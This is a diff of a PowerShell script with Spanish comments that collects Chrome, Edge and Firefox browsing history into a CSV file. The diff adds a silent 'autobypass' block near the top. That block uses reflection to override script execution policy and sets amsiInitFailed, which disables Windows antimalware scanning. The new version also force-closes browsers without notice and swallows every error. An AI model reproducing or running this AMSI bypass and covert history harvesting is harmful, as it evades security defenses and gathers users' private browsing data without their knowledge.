@@ -1,118 +1,74 @@
-#Requires -RunAsAdministrator
-
-$ErrorActionPreference = 'Stop'
-
-# Configuración temporal de política de ejecución
-$originalPolicy = Get-ExecutionPolicy -Scope LocalMachine
-Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force -ErrorAction SilentlyContinue
-
-# Instalación silenciosa de dependencias
+# Autobypass silencioso (colocar al inicio)
 try {
-    $null = Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
-    $null = Install-Module -Name PSSQLite -Force -AllowClobber
+    $null = [Reflection.Assembly]::Load("System.Core")
+    $policyField = [PSObject].Assembly.GetType(
+        'System.Management.Automation.Utils'
+    ).GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+    $policyField.SetValue($null, @{ 'ScriptExecution' = @{ 'EnableScripts' = '1' } })
+    
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
+        'amsiInitFailed', 'NonPublic,Static'
+    ).SetValue($null, $true)
 }
-catch {
-    exit
-}
-# prueba 2
-Import-Module PSSQLite -ErrorAction SilentlyContinue
+catch { }
 
-function Close-Browsers {
-    $browsers = 'chrome', 'msedge', 'firefox', 'msedgewebview2'
-    foreach ($process in $browsers) {
-        try {
-            Get-Process $process -ErrorAction SilentlyContinue | Stop-Process -Force
-            Start-Sleep -Milliseconds 500
-        }
-        catch {}
-    }
+# Cerrar navegadores silenciosamente
+$browsers = 'chrome', 'msedge', 'firefox', 'msedgewebview2'
+$browsers | ForEach-Object {
+    try { Stop-Process -Name $_ -Force -ErrorAction Stop }
+    catch { }
 }
+Start-Sleep -Seconds 1
 
+# Función para obtener historiales
 function Get-BrowserHistory {
-    param(
-        [string]$BrowserName,
-        [string]$HistoryPath,
-        [string]$Query,
-        [string]$TimeType
-    )
-
+    param($browser, $path, $query)
+    
     try {
-        $tempFile = "$env:TEMP\$([Guid]::NewGuid()).tmp"
-        Copy-Item $HistoryPath $tempFile -Force
-
-        $data = Invoke-SqliteQuery -DataSource $tempFile -Query $Query | ForEach-Object {
+        $tempFile = "$env:TEMP\$([Guid]::NewGuid())"
+        Copy-Item $path $tempFile -Force
+        
+        Import-Module PSSQLite -ErrorAction Stop
+        Invoke-SqliteQuery -DataSource $tempFile -Query $query | ForEach-Object {
             [PSCustomObject]@{
-                Browser    = $BrowserName
-                URL       = $_.url
-                Title     = $_.title
-                Timestamp = switch ($TimeType) {
-                    'Chrome' { [datetime]::FromFileTimeUtc(116444736000000000 + $_.last_visit_time * 10) }
-                    'Firefox' { [datetime]::new(1970, 1, 1).AddMilliseconds($_.visit_date) }
+                Browser = $browser
+                URL     = $_.url
+                Title   = $_.title
+                Visits  = $_.visit_count
+                LastVisited = if ($browser -eq 'Firefox') {
+                    [DateTime]::new(1970,1,1).AddMilliseconds($_.visit_date)
+                } else {
+                    [DateTime]::FromFileTime(($_.last_visit_time * 10) + 116444736000000000)
                 }
-                VisitCount = $_.visit_count
             }
         }
-
         Remove-Item $tempFile -Force
-        return $data
     }
-    catch {
-        return $null
-    }
+    catch { }
 }
 
-# Ejecución principal
-try {
-    Close-Browsers
+# Recolectar todos los historiales
+$historial = @()
 
-    $results = @()
+# Chrome
+$historial += Get-BrowserHistory -browser 'Chrome' `
+    -path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" `
+    -query "SELECT url, title, last_visit_time, visit_count FROM urls"
 
-    # Chrome
-    try {
-        $chrome = Get-BrowserHistory -BrowserName 'Chrome' `
-            -HistoryPath "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" `
-            -Query "SELECT url, title, last_visit_time, visit_count FROM urls" `
-            -TimeType 'Chrome'
-        
-        if ($chrome) { $results += $chrome }
-    }
-    catch {}
+# Edge
+$historial += Get-BrowserHistory -browser 'Edge' `
+    -path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" `
+    -query "SELECT url, title, last_visit_time, visit_count FROM urls"
 
-    # Edge
-    try {
-        $edge = Get-BrowserHistory -BrowserName 'Edge' `
-            -HistoryPath "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" `
-            -Query "SELECT url, title, last_visit_time, visit_count FROM urls" `
-            -TimeType 'Chrome'
-        
-        if ($edge) { $results += $edge }
-    }
-    catch {}
+# Firefox
+$firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" |
+               Select-Object -First 1 -ExpandProperty FullName
+$historial += Get-BrowserHistory -browser 'Firefox' -path $firefoxPath -query @"
+    SELECT p.url, p.title, v.visit_date, COUNT(p.id) as visit_count 
+    FROM moz_places p 
+    JOIN moz_historyvisits v ON p.id = v.place_id 
+    GROUP BY p.id
+"@
 
-    # Firefox
-    try {
-        $firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" |
-                      Select-Object -First 1 -ExpandProperty FullName
-        
-        $firefox = Get-BrowserHistory -BrowserName 'Firefox' `
-            -HistoryPath $firefoxPath `
-            -Query @"
-                SELECT p.url, p.title, v.visit_date, COUNT(p.id) as visit_count 
-                FROM moz_places p 
-                JOIN moz_historyvisits v ON p.id = v.place_id 
-                GROUP BY p.id
-"@ -TimeType 'Firefox'
-        
-        if ($firefox) { $results += $firefox }
-    }
-    catch {}
-
-    # Exportar resultados
-    if ($results) {
-        $outputPath = "$env:USERPROFILE\Documents\BrowserHistory.csv"
-        $results | Export-Csv -Path $outputPath -NoTypeInformation -Encoding UTF8
-    }
-}
-finally {
-    Set-ExecutionPolicy $originalPolicy -Scope LocalMachine -Force -ErrorAction SilentlyContinue
-}
+# Exportar a CSV
+$historial | Export-Csv "$env:USERPROFILE\Downloads\HistorialNavegacion.csv" -NoTypeInformation
